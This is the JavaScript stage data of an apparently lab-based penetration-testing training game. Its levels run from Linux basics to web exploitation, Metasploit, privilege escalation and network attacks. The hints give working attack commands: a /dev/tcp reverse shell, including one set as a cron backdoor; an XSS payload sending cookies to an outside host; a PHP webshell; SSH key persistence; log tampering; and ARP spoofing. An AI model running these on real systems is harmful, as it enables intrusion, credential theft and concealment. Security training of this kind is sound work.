...
const INTRO_PAGES = [{
  ...
  sub: "[ CLICK OR PRESS ENTER TO BEGIN ]"
}];
const REF = {
...
const CHAPTERS = [{
  ...
  stages: [{
    id: "1.1",
    title: "First Contact",
    hints: ["Type: whoami", "Type: pwd", "Type: ls"],
    nar: "The cursor blinks. Start at the absolute beginning — who are you, where are you.",
    obj: [{
      id: "whoami",
      l: "Find your username: whoami",
      f: c => c === "whoami"
    }, {
      id: "pwd",
      l: "Find your location: pwd",
      f: c => c === "pwd"
    }, {
      id: "ls",
      l: "See what's around you: ls",
      f: c => c.startsWith("ls")
    }],
    ...
    id: "1.2",
    title: "The Unseen",
    hints: ["Try: ls -la", "Files starting with . are hidden", "cat .secret"],
    nar: "Not everything is visible. Linux hides files starting with a dot — you need ls -la to see them.",
    obj: [{
      id: "lsla",
      l: "Reveal ALL files: ls -la",
      f: c => c.includes("ls") && (c.includes("-la") || c.includes("-al") || c.includes(" -a"))
    }, {
      id: "secret",
      l: "Read the hidden .secret file",
      f: (c, o) => c.includes("cat") && c.includes(".secret")
    }],
    ...
    id: "1.3",
    title: "Navigation",
    hints: ["cd Documents", "cat notes.txt", "cd ~ to go home"],
    nar: "The filesystem is your world. Learn to move through it — cd, ls, cat.",
    obj: [{
      id: "cdDir",
      l: "Enter a directory: cd Documents",
      f: c => c.startsWith("cd ") && !c.includes("~") && !c.includes("..")
    }, {
      id: "catAny",
      l: "Read a file with cat",
      f: c => c.startsWith("cat ")
    }, {
      id: "cdHome",
      l: "Return home: cd ~",
      f: c => c === "cd ~" || c === "cd"
    ...
    hints: ["head /etc/passwd", "tail /var/log/syslog", "grep stranger /etc/passwd"],
    nar: "cat, head, tail, grep — every way to pull information from files. Master all of them.",
    obj: [{
      id: "head",
      l: "First lines: head /etc/passwd",
      f: c => c.startsWith("head")
    }, {
      id: "tail",
      l: "Last lines: tail /var/log/syslog",
      f: c => c.startsWith("tail")
    }, {
      id: "grep1",
      l: "Search inside: grep stranger /etc/passwd",
      f: c => c.startsWith("grep")
    }],
    ...
    hints: ["mkdir workspace", "touch notes.txt", "echo 'text' > file.txt"],
    nar: "You can read. Now create, move, delete. Act on this world.",
    obj: [{
      id: "mkdir",
      l: "Create a directory: mkdir workspace",
      f: c => c.startsWith("mkdir")
    }, {
      id: "touch",
      l: "Create a file: touch notes.txt",
      f: c => c.startsWith("touch")
    }, {
      id: "echord",
      l: "Write to file: echo 'test' > notes.txt",
      f: c => c.startsWith("echo") && c.includes(">")
    }, {
      id: "rmFile",
      l: "Delete a file: rm notes.txt",
      f: c => c.startsWith("rm ")
    }],
  ...
  stages: [{
    id: "2.1",
    title: "The Rule Book",
    hints: ["cat /etc/passwd", "cat /etc/hosts", "cat /etc/crontab"],
    nar: "In /etc, the machine keeps every rule it lives by. Users. Known hosts. Scheduled jobs.",
    obj: [{
      id: "etcPasswd",
      l: "cat /etc/passwd — who has accounts?",
      f: c => c.includes("passwd") && c.includes("cat")
    }, {
      id: "etcHosts",
      l: "cat /etc/hosts — known machines?",
      f: c => c.includes("hosts") && c.includes("cat")
    }, {
      id: "etcCron",
      l: "cat /etc/crontab — scheduled tasks?",
      f: c => c.includes("crontab") && c.includes("cat")
    }],
    ...
    id: "2.2",
    title: "Permissions",
    hints: ["ls -la /etc", "chmod 755 notes.txt", "sudo -l"],
    nar: "Linux controls everything with a 9-character permission string. rwxr-xr-x. Learn to read it fluently.",
    obj: [{
      id: "lsPerm",
      l: "Read permissions: ls -la /etc",
      f: c => c.includes("ls") && c.includes("-l")
    }, {
      id: "chmod",
      l: "Change permissions: chmod 755 notes.txt",
      f: c => c.startsWith("chmod")
    }, {
      id: "sudoL",
      l: "Check sudo rights: sudo -l",
      f: c => c.includes("sudo") && c.includes("-l")
    }],
    ...
    hints: ["ps aux | grep root", "ls > list.txt", "echo 'x' >> list.txt"],
    ...
    obj: [{
      id: "pipe1",
      l: "Use a pipe: ps aux | grep root",
      f: c => c.includes("|")
    }, {
      id: "redir",
      l: "Redirect output: ls -la > filelist.txt",
      f: c => c.includes(">") && !c.includes(">>")
    }, {
      id: "append1",
      l: "Append: echo 'more' >> filelist.txt",
      f: c => c.includes(">>")
    }],
    ...
    hints: ["find / -name '*.conf' 2>/dev/null", "find / -perm -u=s -type f 2>/dev/null", "grep -r 'password' /etc 2>/dev/null"],
    nar: "The filesystem is enormous. find and grep are your flashlights in the dark. Learn every flag.",
    obj: [{
      id: "findName",
      l: "find / -name '*.conf' 2>/dev/null",
      f: c => c.startsWith("find") && c.includes("-name")
    }, {
      id: "findSuid",
      l: "find / -perm -u=s -type f 2>/dev/null",
      f: c => c.startsWith("find") && c.includes("-perm") && c.includes("s")
    }, {
      id: "grepR",
      l: "grep -r 'password' /etc 2>/dev/null",
      f: c => c.startsWith("grep") && c.includes("-r")
    }],
    msg: "SUID binaries found: vim, python3, find.\nAll three are on GTFOBins.\ncat gtfobins.txt when you're ready to escalate."
  }, {
    id: "2.5",
    title: "Text Processing",
    hints: ["awk -F: '{print $1}' /etc/passwd", "cut -d: -f1 /etc/passwd", "wc -l /etc/passwd"],
    nar: "awk, sed, cut, sort, uniq — transform raw data into signal. This is how logs become intelligence.",
    obj: [{
      id: "awk1",
      l: "awk -F: '{print $1}' /etc/passwd",
      f: c => c.startsWith("awk")
    }, {
      id: "cut1",
      l: "cut -d: -f1 /etc/passwd",
      f: c => c.startsWith("cut")
    }, {
      id: "sort1",
      l: "sort some output",
      f: c => c.startsWith("sort") || c.includes("| sort")
    }, {
      id: "wc1",
      l: "wc -l /etc/passwd",
      f: c => c.startsWith("wc")
    ...
    hints: ["for i in 1 2 3; do echo $i; done", "while true; do date; sleep 5; done", "if [ -f /etc/passwd ]; then echo exists; fi"],
    nar: "Loops and conditionals turn your commands into programs. Automate everything.",
    obj: [{
      id: "forLoop",
      l: "Write a for loop: for i in 1 2 3; do echo $i; done",
      f: c => c.includes("for ") && c.includes("do")
    }, {
      id: "ifCond",
      l: "Write an if: if [ -f /etc/passwd ]; then echo yes; fi",
      f: c => c.includes("if [") && c.includes("then")
    }],
  ...
  stages: [{
    id: "3.1",
    title: "Processes",
    hints: ["ps aux", "top", "pgrep sshd", "cat /proc/1/cmdline"],
    nar: "Everything running is a process. Every process has a PID, an owner, a purpose.",
    obj: [{
      id: "psaux",
      l: "List all processes: ps aux",
      f: c => c.includes("ps") && c.includes("aux")
    }, {
      id: "topCmd",
      l: "Live process view: top",
      f: c => c === "top"
    }, {
      id: "procDir",
      l: "cat /proc/1/cmdline — what started this machine?",
      f: c => c.includes("proc") && c.includes("cmdline")
    }],
    ...
    hints: ["id", "who", "last", "groups"],
    nar: "The hierarchy: root owns everything. Understand where you sit in it.",
    obj: [{
      id: "idCmd",
      l: "Check your identity: id",
      f: c => c === "id"
    }, {
      id: "whoCmd",
      l: "Who's logged in: who",
      f: c => c === "who" || c === "w"
    }, {
      id: "lastCmd",
      l: "Login history: last",
      f: c => c === "last"
    }],
    ...
    id: "3.3",
    title: "Services and Sockets",
    hints: ["systemctl list-units --type=service", "ss -tuln", "netstat -an"],
    nar: "Services run in the background — always listening. Map what this machine serves.",
    obj: [{
      id: "sctl",
      l: "List services: systemctl list-units --type=service",
      f: c => c.includes("systemctl")
    }, {
      id: "ssCmd",
      l: "Open sockets: ss -tuln",
      f: c => c.startsWith("ss ")
    }, {
      id: "netstatC",
      l: "Connections: netstat -an",
      f: c => c.startsWith("netstat")
    }],
    ...
    hints: ["env", "echo $PATH", "cat ~/.bashrc"],
    nar: "Your shell has a context — variables, paths, config. Sometimes credentials left by careless admins.",
    obj: [{
      id: "envCmd",
      l: "Print environment: env",
      f: c => c === "env"
    }, {
      id: "bashrcC",
      l: "Read your config: cat ~/.bashrc",
      f: c => c.includes(".bashrc")
    }],
    ...
    hints: ["python3 -c \"print('alive')\"", "python3 -c \"import socket; print(socket.gethostname())\"", "python3 -c \"import os; print(os.popen('id').read())\""],
    nar: "Every security tool is written in Python. You need to be able to read it, write it, and weaponise it.",
    obj: [{
      id: "pyHello",
      l: "python3 -c \"print('alive')\"",
      f: c => c.includes("python3") && c.includes("print")
    }, {
      id: "pySocket",
      l: "python3 -c \"import socket; ...\"",
      f: c => c.includes("python3") && c.includes("socket")
    }, {
      id: "pyOs",
      l: "python3 -c \"import os; os.popen('id').read()\"",
      f: c => c.includes("python3") && c.includes("os")
    }],
  ...
  stages: [{
    id: "4.1",
    title: "Your Position",
    hints: ["ip addr", "ip route", "arp -a"],
    nar: "Before anything else: know where you are. Your IP, subnet, gateway. Who else is on the network.",
    obj: [{
      id: "ipAddr",
      l: "Check your IP: ip addr",
      f: c => c.startsWith("ip a")
    }, {
      id: "ipRoute",
      l: "Check routing: ip route",
      f: c => c.includes("route")
    }, {
      id: "arpA",
      l: "ARP table: arp -a",
      f: c => c.startsWith("arp")
    }],
    ...
    id: "4.2",
    title: "TCP/IP",
    hints: ["cat tcp_notes.txt", "nc -lvnp 4444", "nc localhost 4444"],
    nar: "TCP and UDP are the transport layer. Understand the 3-way handshake. It's the foundation of everything.",
    obj: [{
      id: "tcpNotes",
      l: "cat tcp_notes.txt — understand the handshake",
      f: c => c.includes("tcp_notes")
    }, {
      id: "ncListen",
      l: "Open listener: nc -lvnp 4444",
      f: c => c.includes("nc") && (c.includes("-l") || c.includes("lvnp"))
    }],
    ...
    id: "4.3",
    title: "DNS",
    hints: ["dig google.com A", "dig google.com MX", "dig axfr @ns1.target.machine target.machine"],
    nar: "DNS translates names to IPs. It holds enormous recon value. Learn to pull every record type.",
    obj: [{
      id: "digA",
      l: "dig A record: dig google.com A",
      f: c => c.startsWith("dig") && c.includes(" A")
    }, {
      id: "digMX",
      l: "dig MX: dig google.com MX",
      f: c => c.startsWith("dig") && c.includes("MX")
    }, {
      id: "digAXFR",
      l: "Zone transfer: dig axfr @ns1.target.machine target.machine",
      f: c => c.includes("axfr")
    }],
    ...
    id: "4.4",
    title: "HTTP/S",
    hints: ["curl http://10.0.0.10/", "curl -I http://10.0.0.10/", "curl http://10.0.0.10/robots.txt"],
    nar: "HTTP is the language of the web. Learn to speak it raw — headers, cookies, methods, status codes.",
    obj: [{
      id: "curlGet",
      l: "HTTP GET: curl http://10.0.0.10/",
      f: c => c.startsWith("curl") && c.includes("http") && !c.includes("-I")
    }, {
      id: "curlHead",
      l: "Headers: curl -I http://10.0.0.10/",
      f: c => c.startsWith("curl") && c.includes("-I")
    }, {
      id: "curlRobo",
      l: "Check robots.txt: curl http://10.0.0.10/robots.txt",
      f: c => c.startsWith("curl") && c.includes("robots")
    }],
    ...
    hints: ["tcpdump -i eth0 -n", "tcpdump -i eth0 port 80", "tcpdump -i eth0 -w capture.pcap", "tcpdump -r capture.pcap"],
    nar: "See the actual data. Raw packets. The truth of what's moving across the wire.",
    obj: [{
      id: "tcpBasic",
      l: "Capture packets: tcpdump -i eth0 -n",
      f: c => c.startsWith("tcpdump") && !c.includes("-r") && !c.includes("-w")
    }, {
      id: "tcpWrite",
      l: "Save capture: tcpdump -i eth0 -w capture.pcap",
      f: c => c.startsWith("tcpdump") && c.includes("-w")
    }, {
      id: "tcpRead",
      l: "Read it back: tcpdump -r capture.pcap",
      f: c => c.startsWith("tcpdump") && c.includes("-r")
    }],
  ...
  stages: [{
    id: "5.1",
    title: "Passive Recon",
    hints: ["whois target.machine", "openssl s_client -connect 10.0.0.10:443", "cat google_dorking.txt"],
    nar: "Passive recon leaves zero trace. You gather from sources that already exist publicly.",
    obj: [{
      id: "whois",
      l: "WHOIS lookup: whois target.machine",
      f: c => c.startsWith("whois")
    }, {
      id: "openssl",
      l: "SSL cert info: openssl s_client -connect 10.0.0.10:443",
      f: c => c.startsWith("openssl") && c.includes("s_client")
    }, {
      id: "googDork",
      l: "cat google_dorking.txt",
      f: c => c.includes("google_dorking")
    }],
    ...
    hints: ["dnsrecon -d target.machine", "dig axfr @ns1.target.machine target.machine", "for sub in admin mail vpn; do dig $sub.target.machine; done"],
    nar: "DNS is a goldmine. Zone transfers, brute force, tool-assisted enumeration — pull everything.",
    obj: [{
      id: "dnsrecon",
      l: "dnsrecon -d target.machine",
      f: c => c.startsWith("dnsrecon")
    }, {
      id: "subBrute",
      l: "Brute-force subdomains with a loop",
      f: c => c.includes("for ") && c.includes("dig")
    }],
    msg: "dnsrecon found 7 subdomains. Zone transfer confirmed all.\nEvery internal host mapped without touching a port scanner."
  }, {
    id: "5.3",
    title: "OSINT",
    hints: ["theHarvester -d target.machine -b google", "exiftool employee_photo.jpg", "cat methodology.txt"],
    nar: "Open Source Intelligence — everything publicly available about the target and its people.",
    obj: [{
      id: "harvest",
      l: "theHarvester -d target.machine -b google",
      f: c => c.includes("theHarvester") || c.includes("theharvester")
    }, {
      id: "exiftool1",
      l: "Metadata: exiftool employee_photo.jpg",
      f: c => c.startsWith("exiftool")
    }, {
      id: "method",
      l: "cat methodology.txt",
      f: c => c.includes("methodology")
    }],
    ...
    id: "5.4",
    title: "Active Recon",
    hints: ["arp-scan --localnet", "for i in $(seq 1 20); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo $i; done", "nc -v 10.0.0.10 22"],
    nar: "Now you interact with the target. You will leave traces. Be deliberate.",
    obj: [{
      id: "arpScan",
      l: "ARP scan: arp-scan --localnet",
      f: c => c.includes("arp-scan")
    }, {
      id: "pingSweep",
      l: "Ping sweep with a bash loop",
      f: c => c.includes("for") && c.includes("ping")
    }, {
      id: "banner",
      l: "Banner grab: nc -v 10.0.0.10 22",
      f: c => c.startsWith("nc") && c.includes("10.0.0.10")
    }],
    ...
    hints: ["mkdir workspace", "echo '[target]' > workspace/notes.txt", "cat methodology.txt"],
    nar: "Recon is intelligence work. Build the target picture. Document systematically.",
    obj: [{
      id: "workspace",
      l: "mkdir workspace && cd workspace",
      f: c => c.startsWith("mkdir")
    }, {
      id: "targetFile",
      l: "Create target notes file",
      f: c => c.includes("notes") || c.includes("target")
    }],
  ...
  stages: [{
    ...
    hints: ["nmap 10.0.0.10", "nmap -sV 10.0.0.10", "nmap -sC -sV 10.0.0.10", "nmap -A 10.0.0.10"],
    nar: "nmap is the standard. Learn every flag. You'll use this tool every single day.",
    obj: [{
      id: "nmapBasic",
      l: "Basic scan: nmap 10.0.0.10",
      f: c => c.startsWith("nmap") && c.includes("10.0.0") && !c.includes("-")
    }, {
      id: "nmapSV",
      l: "Version detection: nmap -sV 10.0.0.10",
      f: c => c.startsWith("nmap") && c.includes("-sV")
    }, {
      id: "nmapSC",
      l: "Default scripts: nmap -sC 10.0.0.10",
      f: c => c.startsWith("nmap") && c.includes("-sC")
    }, {
      id: "nmapA",
      l: "Aggressive: nmap -A 10.0.0.10",
      f: c => c.startsWith("nmap") && c.includes("-A")
    }],
    ...
    hints: ["nmap --script=vuln 10.0.0.10", "nmap --script=http-enum 10.0.0.10 -p80", "nmap --script=smb-enum-shares 10.0.0.10"],
    nar: "The Nmap Scripting Engine turns nmap into a full enumeration platform. Hundreds of scripts available.",
    obj: [{
      id: "nmapVuln",
      l: "Vuln scan: nmap --script=vuln 10.0.0.10",
      f: c => c.includes("nmap") && c.includes("vuln")
    }, {
      id: "nmapHttp",
      l: "HTTP enum: nmap --script=http-enum 10.0.0.10 -p80",
      f: c => c.includes("nmap") && c.includes("http-enum")
    }, {
      id: "nmapSmb",
      l: "SMB: nmap --script=smb-enum-shares 10.0.0.10",
      f: c => c.includes("nmap") && c.includes("smb")
    }],
    ...
    hints: ["ftp 10.0.0.10", "nc -v 10.0.0.10 25", "snmpwalk -v1 -c public 10.0.0.10", "enum4linux -a 10.0.0.10"],
    nar: "Each service speaks its own protocol. Enumerate them manually — banner grab, try default credentials, extract info.",
    obj: [{
      id: "ftpEnum",
      l: "FTP: ftp 10.0.0.10 (try anonymous)",
      f: c => c.startsWith("ftp")
    }, {
      id: "snmpEnum",
      l: "SNMP: snmpwalk -v1 -c public 10.0.0.10",
      f: c => c.startsWith("snmpwalk")
    }, {
      id: "enum4l",
      l: "SMB full enum: enum4linux -a 10.0.0.10",
      f: c => c.startsWith("enum4linux")
    }],
    ...
    hints: ["gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt", "nikto -h http://10.0.0.10/", "whatweb http://10.0.0.10/"],
    nar: "Web applications are the most common attack surface. Enumerate them completely.",
    obj: [{
      id: "gobust",
      l: "Directory bust: gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt",
      f: c => c.startsWith("gobuster") || c.startsWith("dirb")
    }, {
      id: "nikto",
      l: "Web scanner: nikto -h http://10.0.0.10/",
      f: c => c.startsWith("nikto")
    }, {
      id: "whatweb",
      l: "Fingerprint: whatweb http://10.0.0.10/",
      f: c => c.startsWith("whatweb")
    }],
    ...
    hints: ["searchsploit Apache 2.4", "searchsploit -m 50383", "cat /opt/scan/nmap_cheatsheet.txt"],
    nar: "Once you have service versions, find known exploits. This is the bridge between scanning and exploitation.",
    obj: [{
      id: "srchspl",
      l: "searchsploit Apache 2.4",
      f: c => c.startsWith("searchsploit") && !c.includes("-m")
    }, {
      id: "srchCopy",
      l: "Copy exploit: searchsploit -m 50383",
      f: c => c.startsWith("searchsploit") && c.includes("-m")
    }],
  ...
  stages: [{
    id: "7.1",
    title: "SQL Injection",
    hints: ["curl -X POST http://10.0.0.10/admin/login.php -d \"username=admin'--&password=x\"", "sqlmap -u 'http://10.0.0.10/login.php' --forms", "cat /home/stranger/Documents/sqli_notes.txt"],
    nar: "SQLi is the most persistent web vulnerability. User input inserted into SQL queries without sanitisation.",
    obj: [{
      id: "sqliManual",
      l: "Manual test: curl -X POST .../login.php -d \"username=admin'--&password=x\"",
      f: c => c.includes("curl") && c.includes("admin'")
    }, {
      id: "sqlmap",
      l: "Automated: sqlmap -u 'http://10.0.0.10/login.php' --forms",
      f: c => c.startsWith("sqlmap")
    }],
    ...
    id: "7.2",
    title: "XSS",
    hints: ["Reflected: <script>alert(1)</script> in a search field", "Stored persists — inject into a comment field: comment <script>alert(1)</script>", "<script>fetch('http://10.0.0.50/'+document.cookie)</script>"],
    nar: "Cross-Site Scripting injects JavaScript into a page. It runs in every visitor's browser.",
    obj: [{
      id: "xssRefl",
      l: "Reflected XSS: test <script>alert(1)</script> in input",
      f: (c, o) => o.includes("XSS") && c.includes("script")
    }, {
      id: "xssStore",
      l: "Stored XSS: put a payload in a comment field",
      f: (c, o) => o.includes("STORED")
    }, {
      id: "xssCookie",
      l: "Cookie theft: <script>fetch('http://10.0.0.50/'+document.cookie)</script>",
      f: c => c.includes("document.cookie")
    }],
    ...
    hints: ["curl http://10.0.0.10/?page=../../../etc/passwd", "curl http://10.0.0.10/?page=../../../etc/shadow", "Test for RFI if allow_url_include=On"],
    nar: "LFI/RFI — when a web app includes files based on user input, you control what it includes.",
    obj: [{
      id: "lfiBasic",
      l: "LFI: curl http://10.0.0.10/?page=../../../etc/passwd",
      f: c => c.includes("curl") && c.includes("../") && c.includes("passwd")
    }, {
      id: "lfiShadow",
      l: "Try: curl http://10.0.0.10/?page=../../../etc/shadow",
      f: c => c.includes("../") && c.includes("shadow")
    }],
    ...
    hints: ["Test 127.0.0.1; id in a ping field", "curl http://10.0.0.10/ping.php -d 'ip=127.0.0.1; id'", "Get a reverse shell: 127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1"],
    nar: "When user input is passed to the OS — the web application becomes a command shell.",
    obj: [{
      id: "cmdInj",
      l: "Test injection: curl .../ping.php -d 'ip=127.0.0.1; id'",
      f: c => c.includes("curl") && c.includes("; id")
    }, {
      id: "cmdShell",
      l: "Get a shell: ip=127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1",
      f: c => c.includes("bash") && c.includes("/dev/tcp") && c.includes("4444")
    }],
    ...
    hints: ["hydra -l admin -P rockyou.txt http-post-form '//login.php:user=^USER^&pass=^PASS^:Invalid'", "Test default credentials: admin/admin, admin/password, admin/admin123"],
    nar: "Weak authentication is everywhere. Dictionary attacks, default creds, password spray.",
    obj: [{
      id: "hydra",
      l: "Hydra brute force: hydra -l admin -P rockyou.txt ...",
      f: c => c.startsWith("hydra")
    }, {
      id: "defCreds",
      l: "Test default creds: curl -d 'user=admin&pass=admin' http://10.0.0.10/admin/login.php",
      f: c => c.includes("curl") && c.includes("admin") && c.includes("pass=")
    }],
    ...
    id: "7.6",
    title: "SSRF and JWT",
    hints: ["curl http://10.0.0.10/fetch.php -d 'url=http://localhost/admin'", "curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'", "Decode JWT: echo TOKEN | base64 -d"],
    nar: "SSRF makes the server fetch internal resources. JWT attacks let you forge authentication tokens.",
    obj: [{
      id: "ssrf",
      l: "SSRF: curl .../fetch.php -d 'url=http://localhost/admin'",
      f: c => c.includes("fetch.php") || c.includes("localhost/admin")
    }, {
      id: "ssrfMeta",
      l: "Cloud SSRF: curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'",
      f: c => c.includes("169.254.169.254")
    }, {
      id: "jwtDecode",
      l: "Decode JWT: echo TOKEN | base64 -d",
      f: c => c.includes("base64") && c.includes("-d")
    }],
  ...
  stages: [{
    ...
    hints: ["msfconsole", "search ms17-010", "use exploit/windows/smb/ms17_010_eternalblue", "show options", "set RHOSTS 10.0.0.10", "run"],
    nar: "Metasploit is the industry-standard exploitation framework. Learn to navigate it completely.",
    obj: [{
      id: "msfStart",
      l: "Start Metasploit: msfconsole",
      f: c => c === "msfconsole"
    }, {
      id: "msfSearch",
      l: "Search: search ms17-010",
      f: c => c.startsWith("search ")
    }, {
      id: "msfSet",
      l: "Set target: set RHOSTS 10.0.0.10",
      f: c => c.startsWith("set ") && c.includes("RHOSTS")
    }, {
      id: "msfRun",
      l: "Execute: run",
      f: c => c === "run" || c === "exploit"
    ...
    id: "8.2",
    title: "Meterpreter",
    hints: ["sysinfo", "getuid", "getsystem", "hashdump", "shell"],
    nar: "Meterpreter is a powerful post-exploitation shell with built-in capabilities far beyond a standard shell.",
    obj: [{
      id: "sysinfo",
      l: "sysinfo — machine information",
      f: c => c === "sysinfo"
    }, {
      id: "getuid",
      l: "getuid — who are you on the target?",
      f: c => c === "getuid"
    }, {
      id: "getsys",
      l: "getsystem — attempt privilege escalation",
      f: c => c === "getsystem"
    }, {
      id: "hashdump",
      l: "hashdump — dump password hashes",
      f: c => c === "hashdump"
    }],
    ...
    hints: ["msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o shell.elf", "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f raw -o shell.php"],
    nar: "msfvenom generates custom payloads for any OS, any architecture, any format.",
    obj: [{
      id: "msfvList",
      l: "List payloads: msfvenom -l payloads | grep linux",
      f: c => c.startsWith("msfvenom") && c.includes("-l")
    }, {
      id: "msfvLinux",
      l: "Linux payload: msfvenom -p linux/x64/shell_reverse_tcp ...",
      f: c => c.startsWith("msfvenom") && c.includes("-p") && c.includes("-f")
    }],
    ...
    hints: ["searchsploit Apache 2.4", "searchsploit -m 50383", "python3 50383.py http://10.0.0.10/"],
    nar: "Metasploit won't always have a module. Learn to exploit manually — download, read, modify, run.",
    obj: [{
      id: "srchFind",
      l: "searchsploit Apache 2.4",
      f: c => c.startsWith("searchsploit")
    }, {
      id: "srchCopy2",
      l: "Copy exploit: searchsploit -m 50383",
      f: c => c.startsWith("searchsploit") && c.includes("-m")
      ...
      id: "runExpl",
      l: "python3 50383.py http://10.0.0.10/",
      f: c => c.startsWith("python3") && c.includes(".py") && c.includes("http")
    }],
    ...
    hints: ["cat shells.txt", "nc -lvnp 4444", "bash -i >& /dev/tcp/10.0.0.50/4444 0>&1", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
    nar: "The reverse shell is the fundamental technique. Master every variant. Know how to stabilise them.",
    obj: [{
      id: "readShells",
      l: "cat shells.txt — learn all variants",
      f: c => c.includes("shells.txt")
    }, {
      id: "ncListen2",
      l: "Set up listener: nc -lvnp 4444",
      f: c => c.includes("nc") && c.includes("-l") && c.includes("4444")
    }, {
      id: "stableShell",
      l: "Stabilise: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
      f: c => c.includes("pty") && c.includes("spawn")
    }],
  ...
  stages: [{
    ...
    hints: ["sudo -l", "find / -perm -u=s -type f 2>/dev/null", "cat /etc/crontab", "./linpeas.sh"],
    nar: "You're www-data or nobody. You need root. There are always paths. Be systematic.",
    obj: [{
      id: "sudoL2",
      l: "sudo -l — what can you run as root?",
      f: c => c.includes("sudo") && c.includes("-l")
    }, {
      id: "suidsFind",
      l: "find / -perm -u=s -type f 2>/dev/null",
      f: c => c.includes("find") && c.includes("-perm") && c.includes("s")
    }, {
      id: "linpeas",
      l: "Run linpeas.sh for automated enumeration",
      f: c => c.includes("linpeas")
    }, {
      id: "gtfobins2",
      l: "cat gtfobins.txt — exploit a SUID binary",
      f: c => c.includes("gtfobins")
    }],
    msg: "vim has SUID. sudo allows vim NOPASSWD.\nGTFOBins: sudo vim -c ':!/bin/bash'\nRoot shell. The machine is yours."
  }, {
    id: "9.2",
    title: "Persistence",
    hints: ["echo 'pubkey' >> /root/.ssh/authorized_keys", "echo '* * * * * root bash -i >& /dev/tcp/10.0.0.50/4444 0>&1' >> /etc/crontab", "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php"],
    nar: "Getting in once is luck. Staying in is craft. Plant multiple persistence mechanisms.",
    obj: [{
      id: "sshKey",
      l: "SSH backdoor: echo 'KEY' >> /root/.ssh/authorized_keys",
      f: c => c.includes("authorized_keys")
    }, {
      id: "cronBack",
      l: "Cron backdoor: add reverse shell to /etc/crontab",
      f: c => c.includes("crontab") && (c.includes("/dev/tcp") || c.includes("reverse"))
    }, {
      id: "webShell",
      l: "Webshell: echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php",
      f: c => c.includes("system") && c.includes("GET") && c.includes("php")
    }],
    ...
    hints: ["cat /etc/shadow", "cat ~/.bash_history", "grep -r 'password' /var/www 2>/dev/null", "env | grep -i pass"],
    nar: "Credentials are currency in a compromised environment. Find every one.",
    obj: [{
      id: "shadowRead",
      l: "cat /etc/shadow (you have root now)",
      f: c => c.includes("shadow") && c.includes("cat")
    }, {
      id: "histCreds",
      l: "cat ~/.bash_history — find credentials in history",
      f: c => c.includes("bash_history")
    }, {
      id: "grepCreds",
      l: "grep -r 'password' /var/www /opt 2>/dev/null",
      f: c => c.startsWith("grep") && c.includes("-r") && c.includes("pass")
    }],
    ...
    hints: ["ssh user@10.0.0.20 (with harvested creds)", "ssh -D 1080 user@10.0.0.10", "proxychains nmap -sT 10.0.0.20"],
    nar: "One machine is a start. The goal is the whole network. Pivot using your foothold.",
    obj: [{
      id: "sshLat",
      l: "SSH to next machine with harvested creds",
      f: c => c.startsWith("ssh") && c.includes("10.0.0.20")
    }, {
      id: "socksPrx",
      l: "SOCKS proxy: ssh -D 1080 user@10.0.0.10",
      f: c => c.includes("ssh") && c.includes("-D") && c.includes("1080")
    }, {
      id: "proxychain",
      l: "Route tools: proxychains nmap -sT 10.0.0.20",
      f: c => c.startsWith("proxychains")
    }],
    ...
    hints: ["history -c", "echo '' > ~/.bash_history", "sed -i '/10.0.0.50/d' /var/log/auth.log", "touch -t 202201010000 modified_file"],
    nar: "Understand what traces you leave — as an attacker, and as a defender who must find them.",
    obj: [{
      id: "histClear",
      l: "Clear bash history: history -c && echo '' > ~/.bash_history",
      f: c => c.includes("history -c") || c.includes("bash_history") && c.includes("echo")
    }, {
      id: "logTamper",
      l: "sed -i '/your_ip/d' /var/log/auth.log",
      f: c => c.startsWith("sed") && c.includes("auth.log")
    }, {
      id: "timestamp",
      l: "Alter timestamps: touch -t 202201010000 file",
      f: c => c.startsWith("touch") && c.includes("-t")
    }],
  ...
  stages: [{
    id: "10.1",
    title: "ARP Spoofing",
    hints: ["arpspoof -i eth0 -t 10.0.0.50 10.0.0.1", "echo 1 > /proc/sys/net/ipv4/ip_forward", "ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//"],
    nar: "ARP has no authentication. Anyone can claim any MAC. Claim the gateway's MAC and all traffic flows through you.",
    obj: [{
      id: "arpSpoof",
      l: "ARP spoof: arpspoof -i eth0 -t 10.0.0.50 10.0.0.1",
      f: c => c.startsWith("arpspoof")
    }, {
      id: "ipForward",
      l: "Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward",
      f: c => c.includes("ip_forward") && c.includes("1")
    }, {
      id: "ettercap",
      l: "Full MITM: ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//",
      f: c => c.startsWith("ettercap")
    }],
    ...
    id: "10.2",
    title: "MITM and SSL Strip",
    hints: ["tcpdump -i eth0 -A port 80", "mitmproxy", "Read about SSLstrip — forcing HTTP downgrade"],
    nar: "In position. Now intercept, analyse, and modify traffic.",
    obj: [{
      id: "tcpMitm",
      l: "Capture MITM traffic: tcpdump -i eth0 -A port 80",
      f: c => c.startsWith("tcpdump") && c.includes("port 80")
    }, {
      id: "mitmproxy",
      l: "HTTP intercept: mitmproxy",
      f: c => c.startsWith("mitmproxy")
    }],
    ...
    id: "10.3",
    title: "WiFi Attacks",
    hints: ["airmon-ng start wlan0", "airodump-ng wlan0mon", "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon", "aircrack-ng capture.cap -w rockyou.txt"],
    nar: "Wireless networks are everywhere. WPA2 can be broken if the password is in a wordlist.",
    obj: [{
      id: "airmon",
      l: "Monitor mode: airmon-ng start wlan0",
      f: c => c.startsWith("airmon-ng")
    }, {
      id: "airodump",
      l: "Scan WiFi: airodump-ng wlan0mon",
      f: c => c.startsWith("airodump-ng")
    }, {
      id: "deauth",
